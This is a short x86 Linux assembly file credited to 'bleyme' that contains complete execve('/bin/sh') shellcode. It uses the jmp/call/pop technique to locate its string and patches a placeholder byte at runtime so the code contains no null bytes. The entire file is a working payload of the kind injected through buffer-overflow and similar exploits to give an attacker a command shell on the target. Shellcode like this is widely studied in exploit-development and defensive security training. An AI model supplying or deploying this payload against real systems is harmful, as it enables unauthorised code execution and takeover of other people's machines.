;----------------------------------
;
; execve /bin/sh asm shellcode
; sh2.asm
; made by bleyme
;

global ca
global fin
segment .text

debut:
       	jmp short jump
ca:
       	pop esi
       	xor eax, eax
       	mov ebx, esi
       	dec byte [ebx + 7]
       	mov [ebx + 8], esi
       	mov [ebx + 12], eax
       	mov al, 11
       	lea ecx, [esi + 8]
       	lea edx, [esi + 12]
       	int 80h
jump:
       	call ca
       	db '/bin/sh',1
fin:

;----------------------------------
